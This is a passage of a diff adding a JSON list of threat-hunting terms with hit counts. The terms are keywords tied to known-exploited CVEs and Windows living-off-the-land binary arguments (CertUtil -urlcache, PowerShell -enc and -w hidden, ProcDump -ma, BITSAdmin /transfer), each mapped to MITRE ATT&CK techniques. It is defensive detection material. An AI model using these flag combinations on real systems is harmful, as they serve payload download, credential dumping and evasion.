+      "techniques": [],
+      "term": "rest command"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21626 RunC Container Escape",
+      "techniques": [],
+      "term": "runc"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21893 Ivanti Connect Secure SSRF",
+      "techniques": [],
+      "term": "server-side request forgery"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4966 Citrix Bleed",
+      "techniques": [],
+      "term": "session token"
+    },
+    {
+      "events_hit": 4,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21412 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": "smartscreen"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-29824 Ivanti EPMM SQL Injection",
+      "techniques": [],
+      "term": "sql injection"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21762 Fortinet FortiOS Out-of-Bounds Write",
+      "techniques": [],
+      "term": "ssl vpn"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21893 Ivanti Connect Secure SSRF",
+      "techniques": [],
+      "term": "ssrf"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-27198 JetBrains TeamCity Authentication Bypass",
+      "techniques": [],
+      "term": "teamcity"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-5217 Chrome V8 Type Confusion",
+      "techniques": [],
+      "term": "type confusion"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-3400 Palo Alto PAN-OS Command Injection",
+      "techniques": [],
+      "term": "unauthenticated"
+    },
+    {
+      "events_hit": 11,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-5217 Chrome V8 Type Confusion",
+      "techniques": [],
+      "term": "v8"
+    },
+    {
+      "events_hit": 20,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4863 Chrome WebP Heap Buffer Overflow",
+      "techniques": [],
+      "term": "webp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36874 Windows Error Reporting Service",
+      "techniques": [],
+      "term": "wercplsupport"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "--bwlimit"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "--checkers"
+    },
+    {
+      "events_hit": 4,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "--config"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ConHost",
+      "techniques": [
+        "T1059.001",
+        "T1202"
+      ],
+      "term": "--headless"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "--log-file"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "--transfers"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ProcDump",
+      "techniques": [
+        "T1003.001",
+        "T1003.002"
+      ],
+      "term": "-accepteula"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-allowdelegate"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-compression"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-decode"
+    },
+    {
+      "events_hit": 16,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-enc"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-encode"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-encodedcommand"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-ep bypass"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-executionpolicy bypass"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Expand",
+      "techniques": [
+        "T1560.001",
+        "T1002"
+      ],
+      "term": "-f:"
+    },
+    {
+      "events_hit": 35,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "lolbin_arg",
+      "subject": "ProcDump",
+      "techniques": [
+        "T1003.001",
+        "T1003.002"
+      ],
+      "term": "-ma"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ProcDump",
+      "techniques": [
+        "T1003.001",
+        "T1003.002"
+      ],
+      "term": "-md"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ProcDump",
+      "techniques": [
+        "T1003.001",
+        "T1003.002"
+      ],
+      "term": "-mm"
+    },
+    {
+      "events_hit": 16,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-noni"
+    },
+    {
+      "events_hit": 32,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-nop"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-p:"
+    },
+    {
+      "events_hit": 16,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "MSDT",
+      "techniques": [
+        "T1218.005",
+        "T1059.001"
+      ],
+      "term": "-path"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-ping"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-r:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-remote:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "-s:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-split"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-u:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-urlcache"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WinRS",
+      "techniques": [
+        "T1021.006"
+      ],
+      "term": "-usessl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CertUtil",
+      "techniques": [
+        "T1105",
+        "T1140",
+        "T1027"
+      ],
+      "term": "-verifyctl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "-w hidden"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "HTML Help",
+      "techniques": [
+        "T1218.001",
+        "T1059.007"
+      ],
+      "term": ".chm"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Control",
+      "techniques": [
+        "T1218.002",
+        "T1059.001"
+      ],
+      "term": ".cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "HTML Help",
+      "techniques": [
+        "T1218.001",
+        "T1059.007"
+      ],
+      "term": ".hlp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": ".hta"
+    },
+    {
+      "events_hit": 23,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".js"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".jse"
+    },
+    {
+      "events_hit": 1,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": ".msi"
+    },
+    {
+      "events_hit": 26,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": ".msp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": ".mst"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".vbe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".vbs"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".wsf"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": ".wsh"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PresentationHost",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": ".xbap"
+    },
+    {
+      "events_hit": 30,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "CScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "//b"
+    },
+    {
+      "events_hit": 92,
+      "file_rate": 0.0088,
+      "files_hit": 9,
+      "kind": "lolbin_arg",
+      "subject": "CScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "//d"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "//nologo"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "CScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "//t:"
+    },
+    {
+      "events_hit": 11,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "lolbin_arg",
+      "subject": "CScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "//x"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/addfile"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/complete"
+    },
+    {
+      "events_hit": 12,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/create"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NlTest",
+      "techniques": [
+        "T1087.002",
+        "T1482"
+      ],
+      "term": "/dclist"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/delete"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NlTest",
+      "techniques": [
+        "T1087.002",
+        "T1482"
+      ],
+      "term": "/domain_trusts"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NlTest",
+      "techniques": [
+        "T1087.002",
+        "T1482"
+      ],
+      "term": "/dsgetdc"
+    },
+    {
+      "events_hit": 22,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/ed"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/end"
+    },
+    {
+      "events_hit": 961,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "lolbin_arg",
+      "subject": "TaskKill",
+      "techniques": [
+        "T1562.001",
+        "T1489"
+      ],
+      "term": "/fi"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NlTest",
+      "techniques": [
+        "T1087.002",
+        "T1482"
+      ],
+      "term": "/finduser"
+    },
+    {
+      "events_hit": 26,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "SystemInfo",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "/fo"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "/format:"
+    },
+    {
+      "events_hit": 12,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "Shutdown",
+      "techniques": [
+        "T1529",
+        "T1531"
+      ],
+      "term": "/fw"
+    },
+    {
+      "events_hit": 7,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "Shutdown",
+      "techniques": [
+        "T1529",
+        "T1531"
+      ],
+      "term": "/hybrid"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Regsvr32",
+      "techniques": [
+        "T1059.001",
+        "T1218.010"
+      ],
+      "term": "/i:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MavInject",
+      "techniques": [
+        "T1055.001",
+        "T1218.013"
+      ],
+      "term": "/inject"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/it"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "/l*v"
+    },
+    {
+      "events_hit": 65,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/mo"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "/node:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "/norestart"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "/p:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "/passive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "TaskKill",
+      "techniques": [
+        "T1562.001",
+        "T1489"
+      ],
+      "term": "/pid"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "/quiet"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/rl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/rp"
+    },
+    {
+      "events_hit": 4,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/ru"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/run"
+    },
+    {
+      "events_hit": 408,
+      "file_rate": 0.0127,
+      "files_hit": 13,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/sc"
+    },
+    {
+      "events_hit": 22,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/sd"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/setcustomheaders"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/setminretrydelay"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/setnotifycmdline"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Shutdown",
+      "techniques": [
+        "T1529",
+        "T1531"
+      ],
+      "term": "/soft"
+    },
+    {
+      "events_hit": 1169,
+      "file_rate": 0.0253,
+      "files_hit": 26,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/st"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "/t:"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/tn"
+    },
+    {
+      "events_hit": 147,
+      "file_rate": 0.0058,
+      "files_hit": 6,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/tr"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BITSAdmin",
+      "techniques": [
+        "T1105",
+        "T1197"
+      ],
+      "term": "/transfer"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "InstallUtil",
+      "techniques": [
+        "T1218.004",
+        "T1059.001"
+      ],
+      "term": "/uninstall"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "RegAsm",
+      "techniques": [
+        "T1218.009",
+        "T1059.001"
+      ],
+      "term": "/unregister"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/v1"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NlTest",
+      "techniques": [
+        "T1087.002",
+        "T1482"
+      ],
+      "term": "/whowill"
+    },
+    {
+      "events_hit": 158,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "SchTasks",
+      "techniques": [
+        "T1053.005",
+        "T1053.002"
+      ],
+      "term": "/xml"
+    },
+    {
+      "events_hit": 5,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "ConHost",
+      "techniques": [
+        "T1059.001",
+        "T1202"
+      ],
+      "term": "0xffffffff"
+    },
+    {
+      "events_hit": 26,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "6to4"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": "about:"
+    },
+    {
+      "events_hit": 94,
+      "file_rate": 0.0322,
+      "files_hit": 33,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "accounts"
+    },
+    {
+      "events_hit": 981,
+      "file_rate": 0.0448,
+      "files_hit": 46,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "add"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PsExec",
+      "techniques": [
+        "T1021.002",
+        "T1569.002"
+      ],
+      "term": "admin$"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "advfirewall"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "advpack.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "AMSI"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MavInject",
+      "techniques": [
+        "T1055.001",
+        "T1218.013"
+      ],
+      "term": "AppV"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "appwiz.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "baseboard get"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "bios get"
+    },
+    {
+      "events_hit": 143,
